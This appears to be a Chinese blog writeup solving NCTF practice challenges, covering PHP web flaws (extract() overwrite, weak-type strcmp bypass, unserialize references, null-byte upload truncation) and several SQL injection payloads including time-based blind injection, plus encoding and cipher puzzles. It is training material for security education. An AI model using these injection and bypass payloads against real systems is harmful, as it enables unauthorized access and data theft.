http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1 变量覆盖nctf{bian_liang_fu_gai!} source.php核心代码如下 123456&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; extract($_POST); if ($pass == $thepassword_123) echo $theflag; &#125; extract()函数原型为int extract(array &amp;$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]]) ，从数组中将变量导入当前符号表，$extract_type缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。 PHP是世界上最好的语言nctf{php_is_best_language} index.txt核心代码如下 1234567891011&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125; 网页会拒绝任何含有hackerDJ的提交(忽略大小写)，但接受urldecode后为hackerDJ的字符串，所以按照对照表编码，并将%编码为%25后提交，自动解码一次后%25变为%,代码中再解码一次后便得到flag。即访问 http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a 这是个二次编码的问题。 伪装者 这是一个到处都有着伪装的世界题目地址：点我 nctf{happy_http_headers} referer改了没用，据说请求头添加X-Forwarded-For: 127.0.0.1即可，没有成功，怀疑服务端代码有问题，可能是和你从哪里来那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。 headernctf{tips_often_hide_here} 使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。 上传绕过 题目地址：猜猜代码怎么写的 nctf{welcome_to_hacks_world} 当filename为1.jpg时返回如下: 12345678910111213141516Array( [0] =&gt; .jpg [1] =&gt; jpg)Upload: 1.jpg&lt;br /&gt;Type: text/plain&lt;br /&gt;Size: 0.0078125 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123; ["dirname"]=&gt; string(9) "./uploads" ["basename"]=&gt; string(5) "1.jpg" ["extension"]=&gt; string(3) "jpg" ["filename"]=&gt; string(1) "1"&#125;&lt;br&gt;必须上传成后缀名为php的文件才行啊！&lt;br&gt;&lt;/body&gt; 当filename为1.php时返回如下： 123456Array( [0] =&gt; .php [1] =&gt; php)不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件 观察源码为： 123456789文件上传&lt;br&gt;&lt;br&gt;&lt;form action="upload.php" method="post"enctype="multipart/form-data"&gt;&lt;label for="file"&gt;Filename:&lt;/label&gt;&lt;input type="hidden" name="dir" value="/uploads/" /&gt;&lt;input type="file" name="file" id="file" /&gt; &lt;br /&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt; 因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改 /uploads/为/uploads/1.php0x00，然后file保持1.jpg，连起来后就是/uploads/1.php%001.jpg，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。） sql注入1 听说你也会注入？地址： 题目地址 nctf{ni_ye_hui_sql?} 在 http://chinalover.sinaapp.com/index.phps 查看源码，核心部分如下： 1234567891011121314151617&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user]; 会对传入参数两端去空格，然后sql拼接如下 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; ， 所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式#注释到行尾，/*bla*/用于行间或多行注释，--也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等。 所以本题可post user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123， sql语句就变成select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;), 查询语句就能成功返回user列，值为admin的那条记录。 pass checknctf{strcmp_is_n0t_3afe} 1234567891011121314&lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo "flag:nctf&#123;*&#125;";&#125;else&#123;echo "the pass is wrong!";&#125;&#125;else&#123;echo "please input pass!";&#125;?&gt; 考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为pass[]= 起名字真难nctf{follow_your_dream} 12345678910111213141516171819202122&gt; &lt;?php&gt; function noother_says_correct($number)&gt; &#123;&gt; $one = ord('1');&gt; $nine = ord('9');&gt; for ($i = 0; $i &lt; strlen($number); $i++)&gt; &#123; &gt; $digit = ord($number&#123;$i&#125;);&gt; if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&gt; &#123;&gt; return false;&gt; &#125;&gt; &#125;&gt; return $number == '54975581388';&gt; &#125;&gt; $flag='*******';&gt; if(noother_says_correct($_GET['key']))&gt; echo $flag;&gt; else &gt; echo 'access denied';&gt; ?&gt;&gt; 要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc， 因此访问 http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc 密码重置 重置管理员账号：admin 的密码 你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件： 点击此链接重置您的密码 nctf{reset_password_often_have_vuln 修改重置链接的URL和POST中对应参数为admin相关的即可。 即向 http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D post user=admin&amp;newpass=aaaaa&amp;vcode=1234 。 php反序列化 123456789101112131415161718192021&gt; &lt;?php&gt; class just4fun &#123;&gt; var $enter;&gt; var $secret;&gt; &#125;&gt; if (isset($_GET['pass'])) &#123;&gt; $pass = $_GET['pass'];&gt; if(get_magic_quotes_gpc())&#123;&gt; $pass=stripslashes($pass);&gt; &#125;&gt; $o = unserialize($pass);&gt; if ($o) &#123;&gt; $o-&gt;secret = "*";&gt; if ($o-&gt;secret === $o-&gt;enter)&gt; echo "Congratulation! Here is my secret: ".$o-&gt;secret;&gt; else &gt; echo "Oh no... You can't fool me";&gt; &#125;&gt; else echo "are you trolling?";&gt; &#125;&gt; 链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同， 从官方文档看到这么一句 Circular references inside the array/object you are serializing will also be stored， 说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。 12345678910111213&lt;?phpclass just4fun&#123; var $secret; var $enter ;&#125;$f=new just4fun();$f-&gt;enter=&amp;$f-&gt;secret;$sf=serialize($f);print_r($sf);$usf=unserialize($sf);echo '&lt;br/&gt;';print_r($usf); 输出如下 O:8:”just4fun”:2:{s:6:”secret”;N;s:5:”enter”;R:2;}just4fun Object ( [secret] =&gt; [enter] =&gt; ) 访问 http://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;} 验证成功。 别处看到flag为nctf{serialize_and_unserialize} sql injection4 继续注入吧~题目地址 TIP:反斜杠可以用来转义仔细查看相关函数的用法 nctf{sql_injection_is_interesting} 页面源代码注释中有SQL构造方式： 123456789101112131415161718192021#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag; 核心函数是htmlentities($str, ENT_QUOTES) ，函数原型是这样 1string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get("default_charset") [, bool $double_encode = true ]]] ) 参数flags缺省情况下与$flags=ENT_QUOTES情况下函数行为不同， 选值为ENT_QUOTES时Will convert both double and single quotes， 也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。 访问http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=%20or%201%23， 也就是构造payload为?username=\&amp;password=%20or%201%23 ，使得查询语句如下： 12345678SELECT * FROM users WHERE name='\' AND pass='%20or%201%23'即SELECT * FROM users WHERE name='\' AND pass=' 『 [name]的值为 [' AND pass=] ，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真』 #' 『 注释掉多余的单引号 』即select * from users where false or 1 附： ​ 具体编码方式可使用 print_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))查看， `ENT_COMPAT ENT_HTML401` ENT_QUOTES [&amp;] =&gt; &amp;amp; [&amp;] =&gt; &amp;amp; [&quot;] =&gt; &amp;quot; [&quot;] =&gt; &amp;quot; [&lt;] =&gt; &amp;lt; [&#39;] =&gt; &amp;#039; [&gt;] =&gt; &amp;gt; [&lt;] =&gt; &amp;lt; … [&gt;] =&gt; &amp;gt; 共100个 共101个 综合题nctf{bash_history_means_what} 1、访问链接得到一大段jsfuck代码，解码后得到document.write(&quot;1bc29b36f623ba82aaf6724fd3b16718.php&quot;) ; 2、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在HTTP响应头得到提示tip:history of bash; 3、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history ，看到页面内容为zip -r flagbak.zip ./* ; 4、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip 得到flag。 sql 注入2 注入第二题~~主要考察union查询传送门:点我带你飞 ntcf{union_select_is_wtf} index/phps中有源码如下 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;&#125;?&gt; 因为 12var_dump(!strcasecmp(array(), $query[pw]));//bool(true)var_dump(!strcasecmp(md5(array()), $query[pw]));//bool(false) 所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的$user处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，mid()，if()和sleep()： 123456MID(str,pos,len)/*需注意pos从1而不是0开始，Return a substring starting from the specified position*/IF(expr1,expr2,expr3)/*If expr1 is TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL), IF() returns expr2. Otherwise, it returns expr3.*/SLEEP(duration)/*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/ 所以构造post数据 1user=admin' and if(mid(pw,1,1)&gt;'9',sleep(2),1)#&amp;pass=blabla 如果if()函数的expr1正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。 pw字段的取值范围为/[\da-e]/， 最后注处字段值为21dd715a3605b2a4053e80387116c190，即md5(&#39;njupt&#39;) 然后postuser=admin&amp;pass=njupt即可。 index.phps藏源码。 1234&gt; 查到另一种简单的做法，即post如下数据&gt; user=&apos; union select &apos;45cf93bd4f762c6597b68e615b153bd0&apos;#&amp;pass=findneo&gt; 其中&apos;45cf93bd4f762c6597b68e615b153bd0&apos;即md5(&apos;findneo&apos;)&gt; &gt; 这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。 综合题2 非xss题 但是欢迎留言~地址：get the flag flag:nctf{you_are_s0_g00d_hacker} 详见南邮CTF平台综合题2writeup 注入实战一 请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉）目标网址：地址flag为管理员密码的32位md5(小写)并且加上nctf{} 手注教程群里面发过。看不懂的话自行百度”mysql手动注入”查阅相关文章 PS:用sqlmap等工具做的就不要厚脸皮提交了 题目貌似坏了，放个 4ct10n 的解答吧。 密码就在上图BSCmarketing24然后再md5加密成 f3d6cc916d0739d853e50bc92911dddbflag: nctf{f3d6cc916d0739d853e50bc92911dddb} 密码重置2 题题被秒，当时我就不乐意了！本题来源于CUMT题目链接 TIPS:1.管理员邮箱观察一下就可以找到2.linux下一般使用vi编辑器，并且异常退出会留下备份文件3.弱类型bypass nctf{thanks_to_cumt_bxs} 1、按照提示，源码中看到管理员邮箱为admin@nuptzj.cn ； 2、wget http://nctf.nuptzj.cn/web14/.submit.php.swp ； 3、 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo "失败了呀"; &#125;&#125; 要求token长度为10且token!=&#39;0&#39;为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以&#39;0e123&#39;==&#39;0&#39;值为真）绕过，访问 http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678 即可。 MISC图种 flag是动态图最后一句话的拼音首字母加上nctf{} nctf{dssdcmlw} binwalk -e 555.gif分离出一张233333.gif，动态图的最后一帧的最后一句话是 都深深的出卖了我 密码学easy! 密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9这题做不出来就剁手吧！ nctf{this_is_base64_encode} 在Linux命令行输入echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d即可 keyboard 看键盘看键盘看键盘！答案非标准格式，提交前加上nctf{}ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm 观察题干字符串在键盘上的位置构成的轨迹。 nctf{areuhack} base64全家桶 全家桶全家桶全家桶！我怎么饿了。。。。。。密文(解密前删除回车)： R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVkzREVOUlJHNFpUTU5KVEdFWlRNTjJF 按base64、base32、base16的顺序解码一遍即可。 nctf{base64 _ base32_and_base16} n次base6412345import base64 as bs='**'while 1: s=b.b64decode(s) print s nctf{please_use_python_to_decode_base64} 骚年来一发吗 密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas 1234567891011&gt; function encode($str)&#123;&gt; $_o=strrev($str);&gt; for($_0=0;$_0&lt;strlrn($_o),$_0++)&#123;&gt; $_c=substr($_o,$_0,1);&gt; $__=ord($_c)+1;&gt; $_c=chr($__);&gt; $_=$_.$_c;&gt; &#125;&gt; return str_rot13(strrev(base64_encode($_)));&gt; &#125;&gt; encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。 1234567891011&lt;?php$s="iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas";function decode($str)&#123; $strtmp=base64_decode(strrev(str_rot13($str))); $res=''; for($i=0;$i&lt;strlen($strtmp);$i++)&#123; $res.=chr(ord(substr($strtmp, $i,1))-1); &#125; return strrev($res);&#125;echo decode($s); nctf{rot13and_base64and_strrev} mixed base64 多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)! 1234567891011121314&gt; import random&gt; from base64 import *&gt; result=&#123;&gt; '16':lambda x:b16encode(x),&gt; '32':lambda x:b32encode(x),&gt; '64':lambda x:b64encode(x)&gt; &#125;&gt; flag=b"&#123;nctf&#123;***&#125;"&gt; for i in range(10):&gt; a=random.choice(['16','32','64'])&gt; flag=result[a](flag)&gt; with open("code.txt",'wb')as f:&gt; f.write(flag)&gt; 解码代码： 123456789101112131415from base64 import b64decode, b32decode, b16decodewith open('code.txt', 'r') as f: c = f.read()def trys(s): for f in [b64decode, b32decode, b16decode]: try: t = f(s) if t[:4] == "nctf": print t return 0 else: trys(t) except: passtrys(c) nctf{random_mixed_base64_encode} 异性相吸 同性真爱，异性相吸都是假的！（题目要求，我是直的） 解密压缩文件里的内容 TIPS:1.xor2.hex2binary3.len(bin(miwen))==len(bin(mingwen)) 123456c=open('密文.txt').read()p=open('明文.txt').read()s=''for i in range(len(c)): s+=chr(ord(c[i])^ord(p[i]))print s nctf{xor_xor_xor_biubiubiu} MD5 python大法好！这里有一段丢失的md5密文e9032???da???08????911513?0???a2要求你还原出他并且加上nctf{}提交 已知线索 明文为： TASC?O3RJMV?WDJKX?ZM 题目来源：安恒杯 123456789101112import hashlibpool = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ's0 = 'TASC?O3RJMV?WDJKX?ZM'ss = s0.split('?')m = 'e9032???da???08????911513?0???a2'for i in pool: for j in pool: for k in pool: s = ss[0] + i + ss[1] + j + ss[2] + k + ss[3] if hashlib.md5(s).hexdigest()[:5] == m[:5]: print s, hashlib.md5(s).hexdigest() break nctf{e9032994dabac08080091151380478a2} Vigenere It is said that Vigenere cipher does not achieve the perfect secrecy actually :-) Tips:1.The encode pragram is given;2.Do u no index of coincidence ？3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction) 12345678910111213141516171819202122232425262728293031323334353637http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp#include &lt;stdio.h&gt;#define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen("ptext.txt", "r"); fpOut = fopen("ctext.txt", "w"); i=0; while (fscanf(fpIn, "%c", &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a "real-world" implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create "production-quality" code =) */ if (ch!='\n') &#123; fprintf(fpOut, "%02X", ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; ----------------------------------------------------------------------------------http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txtF96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 详见 南邮CTF平台 Vigenere writeup 。]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[about]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[关于博客 主要是一些学习记录和个人感想，欢迎留言交流。 用文字抵抗遗忘，希望能写很久，哪怕断断续续。 始于2017/9。 关于我 98年♂，厦大学子，爱智慧，爱技术，好古文，用python。CTF爱好者，老庄迷恋者。 联系我 email: dfindneo@gmail.com 朋友们 Chybeta: https://chybeta.github.io/ lzhtony: https://lxpark.com/ Mads: https://blog.madsome.cn/]]></content>
  </entry>
  <entry>
    <title><![CDATA[categories]]></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[tags]]></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
</search>
